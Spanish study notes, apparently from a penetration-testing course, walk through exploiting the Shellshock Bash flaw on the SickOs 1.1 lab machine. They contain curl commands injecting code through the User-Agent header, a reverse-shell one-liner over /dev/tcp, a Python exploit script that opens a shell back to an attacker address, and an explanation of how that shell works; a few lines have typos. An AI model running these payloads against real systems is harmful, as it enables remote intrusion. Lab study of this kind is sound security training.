- Tags : #shellshock #gobuster #cgibin #recursos #python_script 
Un ataque **Shellshock** es un tipo de ataque informático que aprovecha una vulnerabilidad en el **intérprete de comandos Bash** en sistemas operativos basados en Unix y Linux. Esta vulnerabilidad se descubrió en 2014 y se considera uno de los ataques más grandes y generalizados en la historia de la informática.

Esta vulnerabilidad en Bash permite a los atacantes ejecutar comandos maliciosos en el sistema afectado, lo que les permite tomar el control del sistema y acceder a información confidencial, modificar archivos, instalar programas maliciosos, etc.

La vulnerabilidad Shellshock se produce en el intérprete de comandos Bash, que es utilizado por muchos sistemas operativos Unix y Linux para ejecutar scripts de shell. El problema radica en la forma en que Bash maneja las variables de entorno. Los atacantes pueden inyectar código malicioso en estas variables de entorno, las cuales Bash ejecuta sin cuestionar su origen o contenido.

Los atacantes pueden explotar esta vulnerabilidad a través de diferentes vectores de ataque. Uno de ellos es a través del **User-Agent**, que es la información que el navegador web envía al servidor web para identificar el tipo de navegador y sistema operativo que se está utilizando. Los atacantes pueden manipular el User-Agent para incluir comandos maliciosos, que el servidor web ejecutará al recibir la solicitud.

A continuación se proporciona el enlace directo para la descarga de la máquina ‘**SickOs 1.1**‘. Esta máquina corresponde a la misma que estuvimos enumerando en la clase anterior, solo que en este caso procederemos con la fase de explotación haciendo uso de esta técnica:

- **SickOs 1.1**: [https://www.vulnhub.com/entry/sickos-11,132/](https://www.vulnhub.com/entry/sickos-11,132/)
- **Recursos**: [https://blog.cloudflare.com/inside-shellshock/](https://blog.cloudflare.com/inside-shellshock/)

```bash
gobuster dir -u http://192.168.1.20/ --proxy http://192.168.1.20:3128 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 20 --add-slash


--add-slash #Para que de las rutas que pruebe le ponga un slash al final
```

Detectamos un archivo cgi-bin , Normalmente si se encuentra un cgi-bin es factible testear un ataque shellshock. Es recomendable buscara archivos con extensiones pl,sh,cgi

```bash
gobuster dir -u http://192.168.1.20/cgi-bin/ --proxy http://192.168.1.20:3128 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 20 -x pl,sh,cgi

#Encontramos un file de nombre status y al recibir una respuesta exitosa pues probamos se es vulnerable al ataque explotando al cabecera User-Agent pasandole la ruta absoluta del comando a ejecutar (which whoami)
curl http://192.168.1.20/cgi-bin/status --proxy http://192.168.1.20:3128

curl http://192.168.1.20/cgi-bin/status --proxy http://192.168.1.20:3128 -H -H "User-Agent: () { :; }; /usr/bin/whoami"

#De no reportar nada agragamos uno o 2 echo
curl http://192.168.1.20/cgi-bin/status --proxy http://192.168.1.20:3128 -H -H "User-Agent: () { :; }; echo; /usr/bin/whoami"

#Intentamos ganar acceso
curl http://192.168.1.20/cgi-bin/status --proxy http://192.168.1.20:3128 -H -H "User-Agent: () { :; }; echo /bin/bash -c '/bin/bash -i >& /dev/tcp/ip/port 0>&1'"
```

```python
#!/usr/bin/python3
import sys,signal,requests, threading
from pwn import *
def def_handler(sig,frame):
	print("\n\n[+] Saliendo")
	sys.exit(1)

#Crl+C
signal.signal(signal.SIGINT, def_handler)

main_url = "http://192.168.1.147/cgi-bin/status"
squid_proxy = {'http': 'http://192.168.1.147:3128'}
lport= 4646
def shellshock_attack():
	headers = {'User-Agent': "() { :; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.1.108/4646 0>&1'"}
	r =requests.get(main_url,headers=headers,proxies=squid_proxy)
	
	
if __name__ == '__main__':
	try:
	    threading.Thread(target=shellshock_attack,args=()).start()
	except Except as e:
		log.error(str(e))
	
	shell= listen(lport,timeout=20).wait_for_connection()
	if shell.sock is None:
		log.failure("No se pudo establecer conexion")
		sys.exit(1)
	else:
		shell.interactive()		    
```


```bash
### 1. `bash -c '...'`

Este comando le dice al sistema que ejecute los comandos que están dentro de las comillas simples como una cadena de texto. Esto es útil para asegurar que toda la instrucción se interprete dentro de una nueva instancia de Bash.

### 2. `bash -i`

Lanza una instancia de Bash en modo **interactivo**. Esto es crucial porque:

- Muestra el _prompt_ (ej. `user@hostname$`).
    
- Permite el control de trabajos y la interacción en tiempo real que necesitas para ejecutar comandos después de conectar.
    

### 3. `>& /dev/tcp/ip/port`

Esta es la parte donde ocurre la "magia" de la red en sistemas Linux:

- **`>&`**: Es una redirección que combina tanto la **salida estándar** (stdout) como el **error estándar** (stderr) y los envía al mismo lugar.
    
- **`/dev/tcp/ip/port`**: Bash tiene una función especial donde puede abrir una conexión de red tratando a un servidor remoto como si fuera un archivo local.
    
    - Deberás sustituir `ip` por tu dirección (ej. `192.168.1.3`) y `port` por el puerto donde estés escuchando (ej. `443`).
        

### 4. `0>&1`

Aquí se cierra el círculo de la comunicación:

- **`0`** representa la **entrada estándar** (stdin), es decir, lo que tú escribes.
    
- **`>&1`** le dice a Bash: "redirige la entrada (0) hacia donde ya estás enviando la salida (1)".
    
- **Resultado:** Todo lo que tú escribas en tu máquina atacante será enviado a través del socket de red y ejecutado como comandos en la máquina víctima.
```